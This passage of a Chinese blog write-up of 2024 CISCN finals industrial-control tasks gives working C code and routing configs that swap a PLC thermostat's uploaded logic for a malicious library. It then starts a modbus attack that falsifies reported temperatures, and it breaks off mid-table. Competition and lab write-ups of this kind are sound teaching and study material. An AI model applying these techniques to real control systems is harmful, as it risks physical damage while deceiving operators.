title="恶意逻辑"></a>恶意逻辑</h3><p>本任务显示攻击者通过用恶意逻辑替代正常逻辑对系统进行攻击的行为。</p><p>在<code>logic/hack_logic</code>中，设置了恶意的温度逻辑，在10秒后将始终保持设置温度档位为最高档。这里hack_logic没有列在security的makefile中，需要单独编译，编译后，我们可以看到目录下会出现一个 libthermostat_logic.so 文件，这个文件是用来冒充合法逻辑的恶意逻辑文件。</p><blockquote><p>请为<code>file_replace</code>模块<strong>填充文件替换代码</strong>，并通过修改模块配置文件和切面路由文件，拦截工程师站到plc的二进制逻辑文件传输过程(bin_upload路由），使得file_replace模块在合适位置发挥作用，将所传输的libthermostat_logic.so文件内容替换为hack_logic目录下的同名文件，从而导致系统运行一段时间后温度失控。</p></blockquote><p>可以用<code>task_2_2_1.sh</code>脚本测试二进制逻辑上传过程，用<code>task_2_2_2.sh</code>脚本测试逻辑运行情况，该脚本启动后会5秒读一次温度状况，重复四次。</p><br><p>本题需要修改三个文件：</p><ul><li><code>file_replace.c</code> ：在收到二进制逻辑传输命令后，将正常逻辑替换成hack_logic目录下的恶意逻辑</li><li><code>plugin_config.cfg.task_2_2</code> ：在配置文件中添加file_replace模块</li><li><code>aspect_policy.cfg.task_2_2</code> ：在<code>bin_upload</code>传输过程中插入<code>file_replace</code>模块，使其可以在上传代码时用hack_logic中恶意逻辑替换合法逻辑</li></ul><p>涉及到两个模块需要接触</p><ul><li><code>file_replace</code> ：<code>2024buildup/src/security/file_replace</code>，需要编写<code>file_replace.c</code> 做到自动替换恶意模块</li><li><code>hack_logic </code>：<code>2024buildup/src/logic/hack_logic</code></li></ul><p>手册的可读性太差，直接跑一个task_2_2_1.sh看看其日志文件再对着改</p><p>观察src&#x2F;system&#x2F;logic_upload&#x2F;logic_upload.c的行为，看看是否有攻击的切入点</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240713120324134.png" alt="image-20240713120324134"></p><p>在这个地方完成了文件的复制，然后再也没管过，也没有任何的校验措施。后续是连着文件名一起发了过去的，如果能对这个文件名指向的文件进行覆写应该就能成了</p><p>src&#x2F;security&#x2F;file_replace&#x2F;file_replace.c</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">bin_file_replace</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span> sub_proc<span class="token punctuation">,</span><span class="token keyword">void</span> <span class="token operator">*</span> recv_msg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> type<span class="token punctuation">;</span>        <span class="token keyword">int</span> subtype<span class="token punctuation">;</span>        <span class="token keyword">int</span> i<span class="token punctuation">;</span>        <span class="token keyword">int</span> ret<span class="token punctuation">;</span>        <span class="token function">RECORD</span><span class="token punctuation">(</span>PLC_ENGINEER<span class="token punctuation">,</span>LOGIC_UPLOAD<span class="token punctuation">)</span> <span class="token operator">*</span> bin_upload<span class="token punctuation">;</span>        ret<span class="token operator">=</span><span class="token function">message_get_record</span><span class="token punctuation">(</span>recv_msg<span class="token punctuation">,</span><span class="token operator">&amp;</span>bin_upload<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>ret<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span>                <span class="token keyword">return</span> ret<span class="token punctuation">;</span>        <span class="token comment">// 在这里添加文件替换代码</span>        <span class="token keyword">void</span><span class="token operator">*</span> c<span class="token operator">=</span><span class="token function">message_clone</span><span class="token punctuation">(</span>recv_msg<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">RECORD</span><span class="token punctuation">(</span>PLC_ENGINEER<span class="token punctuation">,</span>LOGIC_UPLOAD<span class="token punctuation">)</span> <span class="token operator">*</span> logic_upload<span class="token punctuation">;</span>        <span class="token function">RECORD</span><span class="token punctuation">(</span>PLC_ENGINEER<span class="token punctuation">,</span>LOGIC_CODE<span class="token punctuation">)</span> <span class="token operator">*</span> logic_code<span class="token punctuation">;</span>        <span class="token function">RECORD</span><span class="token punctuation">(</span>PLC_ENGINEER<span class="token punctuation">,</span>LOGIC_BIN<span class="token punctuation">)</span> <span class="token operator">*</span> logic_bin<span class="token punctuation">;</span>        <span class="token function">RECORD</span><span class="token punctuation">(</span>PLC_ENGINEER<span class="token punctuation">,</span>LOGIC_RETURN<span class="token punctuation">)</span> <span class="token operator">*</span> logic_return<span class="token punctuation">;</span>        MSG_EXPAND <span class="token operator">*</span> msg_expand<span class="token punctuation">;</span>        <span class="token function">message_get_record</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span><span class="token operator">&amp;</span>logic_upload<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">message_remove_expand</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span><span class="token function">TYPE_PAIR</span><span class="token punctuation">(</span>PLC_ENGINEER<span class="token punctuation">,</span>LOGIC_BIN<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>msg_expand<span class="token punctuation">)</span><span class="token punctuation">;</span>        logic_bin <span class="token operator">=</span> msg_expand<span class="token operator">-></span>expand<span class="token punctuation">;</span>        <span class="token function">puts</span><span class="token punctuation">(</span>logic_upload<span class="token operator">-></span>plc_devname<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">char</span><span class="token operator">*</span> s<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">char</span><span class="token operator">*</span> dic<span class="token operator">=</span><span class="token string">"0123456789abcdef"</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>DIGEST_SIZE<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                s<span class="token punctuation">[</span>i<span class="token operator">&lt;&lt;</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>dic<span class="token punctuation">[</span><span class="token punctuation">(</span>logic_upload<span class="token operator">-></span>uuid<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&amp;</span><span class="token number">0xf0</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                s<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token operator">&lt;&lt;</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>dic<span class="token punctuation">[</span>logic_upload<span class="token operator">-></span>uuid<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&amp;</span><span class="token number">0xf</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        s<span class="token punctuation">[</span>DIGEST_SIZE<span class="token operator">&lt;&lt;</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>        <span class="token function">puts</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> fsrc<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/root/2024buildup/src/logic/hack_logic/libthermostat_logic.so"</span><span class="token punctuation">,</span>O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">char</span><span class="token operator">*</span> fn<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">Strcpy</span><span class="token punctuation">(</span>fn<span class="token punctuation">,</span><span class="token string">"logic_bin/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">Strcat</span><span class="token punctuation">(</span>fn<span class="token punctuation">,</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> fdst<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span>fn<span class="token punctuation">,</span>O_WRONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span> buf<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">calloc</span><span class="token punctuation">(</span>DIGEST_SIZE<span class="token operator">&lt;&lt;</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> len<span class="token operator">=</span><span class="token function">read</span><span class="token punctuation">(</span>fsrc<span class="token punctuation">,</span>buf<span class="token punctuation">,</span>DIGEST_SIZE<span class="token operator">&lt;&lt;</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>len<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                ret<span class="token operator">=</span><span class="token function">write</span><span class="token punctuation">(</span>fdst<span class="token punctuation">,</span>buf<span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>len<span class="token operator">&lt;</span><span class="token punctuation">(</span>DIGEST_SIZE<span class="token operator">&lt;&lt;</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">break</span><span class="token punctuation">;</span>                len<span class="token operator">=</span><span class="token function">read</span><span class="token punctuation">(</span>fsrc<span class="token punctuation">,</span>buf<span class="token punctuation">,</span>DIGEST_SIZE<span class="token operator">&lt;&lt;</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">close</span><span class="token punctuation">(</span>fsrc<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">close</span><span class="token punctuation">(</span>fdst<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">free</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">free</span><span class="token punctuation">(</span>fn<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">free</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//文件替换代码结束</span>        <span class="token function">ex_module_sendmsg</span><span class="token punctuation">(</span>sub_proc<span class="token punctuation">,</span>recv_msg<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> ret<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后是撰写路由规则。plugin里面只需要把模块加进去即可。路由规则的话，直接跑一遍脚本然后看日志，决定在哪里搞切面。</p><p>instance&#x2F;engineer&#x2F;station&#x2F;plugin_config.cfg.task_2_2</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>        <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"msg_send"</span><span class="token punctuation">,</span>        <span class="token property">"libname"</span><span class="token operator">:</span><span class="token string">"msgfile_send"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span>        <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"msg_print"</span><span class="token punctuation">,</span>        <span class="token property">"libname"</span><span class="token operator">:</span><span class="token string">"msgrecord_print"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span>        <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"file_dealer"</span><span class="token punctuation">,</span>        <span class="token property">"libname"</span><span class="token operator">:</span><span class="token string">"file_dealer"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span>        <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login_user"</span><span class="token punctuation">,</span>        <span class="token property">"libname"</span><span class="token operator">:</span><span class="token string">"login_user"</span><span class="token punctuation">,</span>        <span class="token property">"init_para"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>                <span class="token property">"mode"</span><span class="token operator">:</span><span class="token number">1</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span>        <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"logic_upload"</span><span class="token punctuation">,</span>        <span class="token property">"libname"</span><span class="token operator">:</span><span class="token string">"logic_upload"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span>        <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"file_replace"</span><span class="token punctuation">,</span>        <span class="token property">"libname"</span><span class="token operator">:</span><span class="token string">"file_replace"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>instance&#x2F;engineer&#x2F;station&#x2F;aspect_policy.cfg.task_2_2</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>        <span class="token property">"policy_head"</span><span class="token operator">:</span>        <span class="token punctuation">&#123;</span>                <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login"</span><span class="token punctuation">,</span>                <span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"ASPECT"</span><span class="token punctuation">,</span>                <span class="token property">"sender"</span><span class="token operator">:</span><span class="token string">"login_user"</span><span class="token punctuation">,</span>                <span class="token property">"ljump"</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span>                <span class="token property">"rjump"</span><span class="token operator">:</span><span class="token number">-2</span><span class="token punctuation">,</span>                <span class="token property">"newname"</span><span class="token operator">:</span><span class="token string">"challenge_login"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"MATCH_RULES"</span><span class="token operator">:</span>        <span class="token punctuation">[</span>                <span class="token punctuation">&#123;</span>                        <span class="token property">"op"</span><span class="token operator">:</span><span class="token string">"AND"</span><span class="token punctuation">,</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"USER_DEFINE"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"LOGIN"</span>                <span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"ROUTE_RULES"</span><span class="token operator">:</span>        <span class="token punctuation">&#123;</span>                <span class="token property">"main_policy"</span><span class="token operator">:</span><span class="token punctuation">[</span>                        <span class="token punctuation">&#123;</span><span class="token property">"target_type"</span><span class="token operator">:</span><span class="token string">"CONN"</span><span class="token punctuation">,</span><span class="token property">"target_name"</span><span class="token operator">:</span><span class="token string">"center_client"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                <span class="token punctuation">]</span>                <span class="token property">"response_policy"</span><span class="token operator">:</span><span class="token punctuation">[</span>                        <span class="token punctuation">&#123;</span><span class="token property">"target_type"</span><span class="token operator">:</span><span class="token string">"LOCAL"</span><span class="token punctuation">,</span><span class="token property">"target_name"</span><span class="token operator">:</span><span class="token string">"login_user"</span><span class="token punctuation">&#125;</span>                <span class="token punctuation">]</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span>        <span class="token property">"policy_head"</span><span class="token operator">:</span>        <span class="token punctuation">&#123;</span>                <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"bin_upload"</span><span class="token punctuation">,</span>                <span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"ASPECT"</span><span class="token punctuation">,</span>                <span class="token property">"ljump"</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span>                <span class="token property">"rjump"</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span>                <span class="token property">"newname"</span><span class="token operator">:</span><span class="token string">"filereplace"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"MATCH_RULES"</span><span class="token operator">:</span>        <span class="token punctuation">[</span>                <span class="token punctuation">&#123;</span>                        <span class="token property">"op"</span><span class="token operator">:</span><span class="token string">"AND"</span><span class="token punctuation">,</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_ENGINEER"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"LOGIC_UPLOAD"</span>                <span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"ROUTE_RULES"</span><span class="token operator">:</span>        <span class="token punctuation">&#123;</span>                <span class="token property">"main_policy"</span><span class="token operator">:</span><span class="token punctuation">[</span>                        <span class="token punctuation">&#123;</span><span class="token property">"target_type"</span><span class="token operator">:</span><span class="token string">"LOCAL"</span><span class="token punctuation">,</span><span class="token property">"target_name"</span><span class="token operator">:</span><span class="token string">"file_replace"</span><span class="token punctuation">&#125;</span>                <span class="token punctuation">]</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>跑验证脚本看看</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240713120528156.png" alt="image-20240713120528156"></p><p>上传逻辑没问题</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240713120803696.png" alt="image-20240713120803696"></p><p>温度上升，攻击成功</p><hr><h3 id="modbus数据监听与篡改"><a href="#modbus数据监听与篡改" class="headerlink" title="modbus数据监听与篡改"></a>modbus数据监听与篡改</h3><p>本任务演示对modbus协议数据的攻击行为，选手需要对modbus协议有基础的了解。</p><blockquote><p>在modbus_hacker实例中，modbus_monitor模块接入到modbus主设备和从设备的通信线路中，准备窃听当前温度。窃听温度后不必输出，当温度超过43度时，模块应篡改回传的温度数值，使操作员和监视员看到的温度始终低于43度。</p></blockquote><p>可以用operator_start.sh脚本观察modbus协议的输入输出，modbus_hacker实例的<code>modbus_monitor</code>模块会打印协议的输入输出信息。注意后续实验时，为测试访控和加密效果，modbus_monitor模块建议改回原版模块。</p><br><p>本题需要修改一个源码文件<code>modbus_monitor.c</code> ：执行modbus协议数据窃听modbus协议温度数值并进行篡改攻击</p><p>核心效果，就是当温度高于43度的时候，将数据篡改为低于43度，以实现对温度监控的破坏</p><p>在本地运行<code>operator_start.sh</code>，获得一组用于分析的数据：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"> get modbus data <span class="token number">12</span> bytes from client<span class="token operator">!</span>01 00 00 00 00 06 01 05 02 00 00 ff  get modbus data <span class="token number">12</span> bytes from server<span class="token operator">!</span>01 00 00 00 00 06 01 05 02 00 00 ff <span class="token punctuation">&#123;</span><span class="token string">"plc_devname"</span><span class="token builtin class-name">:</span><span class="token string">"thermostat"</span>,<span class="token string">"action"</span><span class="token builtin class-name">:</span><span class="token string">"ON"</span>,<span class="token string">"action_desc"</span><span class="token builtin class-name">:</span><span class="token string">"heating_S"</span>,<span class="token string">"value"</span>:65280,<span class="token string">"result"</span>:0,<span class="token string">"time"</span>:0<span class="token punctuation">&#125;</span> get modbus data <span class="token number">12</span> bytes from client<span class="token operator">!</span>02 00 00 00 00 06 01 04 <span class="token number">34</span> <span class="token number">75</span> 01 00  get modbus data <span class="token number">11</span> bytes from server<span class="token operator">!</span>02 00 00 00 00 05 01 04 02 8c <span class="token number">10</span> <span class="token punctuation">&#123;</span><span class="token string">"plc_devname"</span><span class="token builtin class-name">:</span><span class="token string">"thermostat"</span>,<span class="token string">"action"</span><span class="token builtin class-name">:</span><span class="token string">"MONITOR"</span>,<span class="token string">"action_desc"</span><span class="token builtin class-name">:</span><span class="token string">"curr_T"</span>,<span class="token string">"value"</span>:423<span class="token number">6</span>,<span class="token string">"result"</span>:0,<span class="token string">"time"</span>:0<span class="token punctuation">&#125;</span> get modbus data <span class="token number">12</span> bytes from client<span class="token operator">!</span>03 00 00 00 00 06 01 06 <span class="token number">43</span> 9c 3c 0f  get modbus data <span class="token number">12</span> bytes from server<span class="token operator">!</span>03 00 00 00 00 06 01 06 <span class="token number">43</span> 9c 3c 0f <span class="token punctuation">&#123;</span><span class="token string">"plc_devname"</span><span class="token builtin class-name">:</span><span class="token string">"thermostat"</span>,<span class="token string">"action"</span><span class="token builtin class-name">:</span><span class="token string">"ADJUST"</span>,<span class="token string">"action_desc"</span><span class="token builtin class-name">:</span><span class="token string">"set_T"</span>,<span class="token string">"value"</span>:3900,<span class="token string">"result"</span>:0,<span class="token string">"time"</span>:0<span class="token punctuation">&#125;</span> target T is <span class="token number">3900</span><span class="token operator">!</span><span class="token builtin class-name">exit</span> the proc<span class="token operator">!</span>  get modbus data <span class="token number">12</span> bytes from client<span class="token operator">!</span>04 00 00 00 00 06 01 04 <span class="token number">34</span> <span class="token number">75</span> 01 00  get modbus data <span class="token number">11</span> bytes from server<span class="token operator">!</span>04 00 00 00 00 05 01 04 02 9d <span class="token number">13</span> <span class="token punctuation">&#123;</span><span class="token string">"plc_devname"</span><span class="token builtin class-name">:</span><span class="token string">"thermostat"</span>,<span class="token string">"action"</span><span class="token builtin class-name">:</span><span class="token string">"MONITOR"</span>,<span class="token string">"action_desc"</span><span class="token builtin class-name">:</span><span class="token string">"curr_T"</span>,<span class="token string">"value"</span>:502<span class="token number">1</span>,<span class="token string">"result"</span>:0,<span class="token string">"time"</span>:0<span class="token punctuation">&#125;</span> get modbus data <span class="token number">12</span> bytes from client<span class="token operator">!</span>05 00 00 00 00 06 01 03 <span class="token number">45</span> 9c 01 00  get modbus data <span class="token number">11</span> bytes from server<span class="token operator">!</span>05 00 00 00 00 05 01 03 02 09 00 <span class="token punctuation">&#123;</span><span class="token string">"plc_devname"</span><span class="token builtin class-name">:</span><span class="token string">"thermostat"</span>,<span class="token string">"action"</span><span class="token builtin class-name">:</span><span class="token string">"MONITOR"</span>,<span class="token string">"action_desc"</span><span class="token builtin class-name">:</span><span class="token string">"heating_G"</span>,<span class="token string">"value"</span><span class="token builtin class-name">:</span><span class="token number">9</span>,<span class="token string">"result"</span>:0,<span class="token string">"time"</span>:0<span class="token punctuation">&#125;</span><span class="token builtin class-name">exit</span> the proc<span class="token operator">!</span>  get modbus data <span class="token number">12</span> bytes from client<span class="token operator">!</span>06 00 00 00 00 06 01 04 <span class="token number">34</span> <span class="token number">75</span> 01 00  get modbus data <span class="token number">11</span> bytes from server<span class="token operator">!</span>06 00 00 00 00 05 01 04 02 <span class="token number">12</span> 1c <span class="token punctuation">&#123;</span><span class="token string">"plc_devname"</span><span class="token builtin class-name">:</span><span class="token string">"thermostat"</span>,<span class="token string">"action"</span><span class="token builtin class-name">:</span><span class="token string">"MONITOR"</span>,<span class="token string">"action_desc"</span><span class="token builtin class-name">:</span><span class="token string">"curr_T"</span>,<span class="token string">"value"</span>:718<span class="token number">6</span>,<span class="token string">"result"</span>:0,<span class="token string">"time"</span>:0<span class="token punctuation">&#125;</span> get modbus data <span class="token number">12</span> bytes from client<span class="token operator">!</span>07 00 00 00 00 06 01 03 <span class="token number">45</span> 9c 01 00  get modbus data <span class="token number">11</span> bytes from server<span class="token operator">!</span>07 00 00 00 00 05 01 03 02 09 00 <span class="token punctuation">&#123;</span><span class="token string">"plc_devname"</span><span class="token builtin class-name">:</span><span class="token string">"thermostat"</span>,<span class="token string">"action"</span><span class="token builtin class-name">:</span><span class="token string">"MONITOR"</span>,<span class="token string">"action_desc"</span><span class="token builtin class-name">:</span><span class="token string">"heating_G"</span>,<span class="token string">"value"</span><span class="token builtin class-name">:</span><span class="token number">9</span>,<span class="token string">"result"</span>:0,<span class="token string">"time"</span>:0<span class="token punctuation">&#125;</span><span class="token builtin class-name">exit</span> the proc<span class="token operator">!</span>  get modbus data <span class="token number">12</span> bytes from client<span class="token operator">!</span>08 00 00 00 00 06 01 04 <span class="token number">34</span> <span class="token number">75</span> 01 00  get modbus data <span class="token number">11</span> bytes from server<span class="token operator">!</span>08 00 00 00 00 05 01 04 02 b3 1e <span class="token punctuation">&#123;</span><span class="token string">"plc_devname"</span><span class="token builtin class-name">:</span><span class="token string">"thermostat"</span>,<span class="token string">"action"</span><span class="token builtin class-name">:</span><span class="token string">"MONITOR"</span>,<span class="token string">"action_desc"</span><span class="token builtin class-name">:</span><span class="token string">"curr_T"</span>,<span class="token string">"value"</span>:785<span class="token number">9</span>,<span class="token string">"result"</span>:0,<span class="token string">"time"</span>:0<span class="token punctuation">&#125;</span> get modbus data <span class="token number">12</span> bytes from client<span class="token operator">!</span>09 00 00 00 00 06 01 03 <span class="token number">45</span> 9c 01 00  get modbus data <span class="token number">11</span> bytes from server<span class="token operator">!</span>09 00 00 00 00 05 01 03 02 09 00 <span class="token punctuation">&#123;</span><span class="token string">"plc_devname"</span><span class="token builtin class-name">:</span><span class="token string">"thermostat"</span>,<span class="token string">"action"</span><span class="token builtin class-name">:</span><span class="token string">"MONITOR"</span>,<span class="token string">"action_desc"</span><span class="token builtin class-name">:</span><span class="token string">"heating_G"</span>,<span class="token string">"value"</span><span class="token builtin class-name">:</span><span class="token number">9</span>,<span class="token string">"result"</span>:0,<span class="token string">"time"</span>:0<span class="token punctuation">&#125;</span><span class="token builtin class-name">exit</span> the proc<span class="token operator">!</span>  get modbus data <span class="token number">12</span> bytes from client<span class="token operator">!</span>0a 00 00 00 00 06 01 04 <span class="token number">34</span> <span class="token number">75</span> 01 00  get modbus data <span class="token number">11</span> bytes from server<span class="token operator">!</span>0a 00 00 00 00 05 01 04 02 c2 1f <span class="token punctuation">&#123;</span><span class="token string">"plc_devname"</span><span class="token builtin class-name">:</span><span class="token string">"thermostat"</span>,<span class="token string">"action"</span><span class="token builtin class-name">:</span><span class="token string">"MONITOR"</span>,<span class="token string">"action_desc"</span><span class="token builtin class-name">:</span><span class="token string">"curr_T"</span>,<span class="token string">"value"</span>:813<span class="token number">0</span>,<span class="token string">"result"</span>:0,<span class="token string">"time"</span>:0<span class="token punctuation">&#125;</span> get modbus data <span class="token number">12</span> bytes from client<span class="token operator">!</span>0b 00 00 00 00 06 01 03 <span class="token number">45</span> 9c 01 00  get modbus data <span class="token number">11</span> bytes from server<span class="token operator">!</span>0b 00 00 00 00 05 01 03 02 09 00 <span class="token punctuation">&#123;</span><span class="token string">"plc_devname"</span><span class="token builtin class-name">:</span><span class="token string">"thermostat"</span>,<span class="token string">"action"</span><span class="token builtin class-name">:</span><span class="token string">"MONITOR"</span>,<span class="token string">"action_desc"</span><span class="token builtin class-name">:</span><span class="token string">"heating_G"</span>,<span class="token string">"value"</span><span class="token builtin class-name">:</span><span class="token number">9</span>,<span class="token string">"result"</span>:0,<span class="token string">"time"</span>:0<span class="token punctuation">&#125;</span><span class="token builtin class-name">exit</span> the proc<span class="token operator">!</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>与上文的比对，可以得到温度数据<code>curr_T</code>应该由<code>server端</code>得到，改变的为<code>Buf[9]</code>和<code>Buf[10]</code>两个部分</p><table><thead><tr><th>modbus data from server</th><th>Buf[9], Buf[10]</th><th>curr_T value</th></tr></thead><tbody><tr><td>02 00 00 00 00 05 01 04 02 8c 10</td><td>8c 10</td><td>4236</td></tr><tr><td>04 00 00 00 00 05 01 04 02 9d 13</td><td>9d 13</td><td>5021</td></tr><tr><td>06 00 00 00 00 05 01 04 02 12 1c</td><td>12 1c</td><td>7186</td></tr><tr><td>08 00 00 00 00 05 01 04 02 b3 1e</td><td>b3 1e</td><td>7859</td></tr><tr><td>0a 00 00 00 00 05 01 04 02 c2 1f</td><td>c2 